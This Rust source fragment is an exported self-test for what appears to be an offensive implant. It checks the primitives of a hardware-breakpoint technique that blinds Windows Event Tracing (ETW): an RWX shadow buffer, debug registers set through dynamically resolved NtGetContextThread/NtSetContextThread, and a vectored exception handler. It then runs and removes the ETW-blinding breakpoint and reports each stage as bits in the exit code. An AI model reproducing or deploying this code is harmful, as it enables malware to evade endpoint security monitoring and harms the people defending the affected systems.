#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_hwbp_blind() {
    let mut mask: u32 = 0;

    // Step 1: Init shadow buffer (VirtualAlloc RWX + write stubs).
    if crate::blind_hwbp::init_shadow_buffer() {
        mask |= 1 << 0;
    }

    // Step 2: Test NtGetContextThread / NtSetContextThread on NT_CURRENT_THREAD
    // with CONTEXT_DEBUG_REGISTERS — this isolates the CONTEXT buffer from the
    // VEH handler / DR register logic.
    {
        use crate::blind_hwbp::{CTX_DR0, CTX_DR7};
        let ctxp = crate::blind_hwbp::alloc_ctx_for_test();
        let buf = crate::blind_hwbp::ctx_buf_for_test(ctxp);
        // ContextFlags = CONTEXT_AMD64 | CONTEXT_DEBUG_REGISTERS (0x100010)
        core::ptr::write_unaligned(buf.add(0x30) as *mut u32, 0x0010_0010);
        type FnCtx = unsafe extern "system" fn(usize, usize) -> i32;
        let ntgct: FnCtx = core::mem::transmute(
            crate::resolve::export_addr(b"ntdll.dll", b"NtGetContextThread").unwrap());
        const NT: usize = 0xFFFF_FFFF_FFFF_FFFE;
        let st = ntgct(NT, buf as *mut _ as usize);
        if st >= 0 {
            mask |= 1 << 1;
            // Read DR0 and DR7 to verify the buffer is writable + correct.
            let dr0 = core::ptr::read_unaligned(buf.add(CTX_DR0) as *const u64);
            let dr7 = core::ptr::read_unaligned(buf.add(CTX_DR7) as *const u64);
            let _ = (dr0, dr7); // just verify reads don't crash
            mask |= 1 << 2;
        }
        // Test SetContextThread — set DR7 back to what it was (no-op).
        core::ptr::write_unaligned(buf.add(0x30) as *mut u32, 0x0010_0010);
        let ntsct: FnCtx = core::mem::transmute(
            crate::resolve::export_addr(b"ntdll.dll", b"NtSetContextThread").unwrap());
        let st2 = ntsct(NT, buf as *mut _ as usize);
        if st2 >= 0 {
            mask |= 1 << 3;
        }
        crate::blind_hwbp::free_ctx_for_test(ctxp);
    }

    // Step 3: Test AddVectoredExceptionHandler + Remove in isolation.
    if let Some(addr) = crate::resolve::export_addr(b"kernel32.dll", b"AddVectoredExceptionHandler") {
        type AddVEH = unsafe extern "system" fn(usize, unsafe extern "system" fn(usize) -> i32) -> *mut core::ffi::c_void;
        let f: AddVEH = core::mem::transmute(addr);
        let h = f(1, crate::blind_hwbp::hwbp_veh_handler);
        if !h.is_null() {
            mask |= 1 << 4;
            if let Some(rm) = crate::resolve::export_addr(b"kernel32.dll", b"RemoveVectoredExceptionHandler") {
                type RemoveVEH = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
                let fr: RemoveVEH = core::mem::transmute(rm);
                fr(h);
                mask |= 1 << 5;
            }
        }
    }

    // Step 4: Full add_hwbp + remove_hwbp (only if all primitives passed).
    if mask == 0x3F { // bits 0-5 all set
        if let Ok(slot) = crate::blind_hwbp::blind_etw_hwbp() {
            mask |= 1 << 6;
            let _ = crate::blind_hwbp::remove_hwbp(slot);
            if crate::blind_hwbp::active_count() == 0 {
                mask |= 1 << 7;
            }
        }
    }

    unsafe { exit(mask) };
}
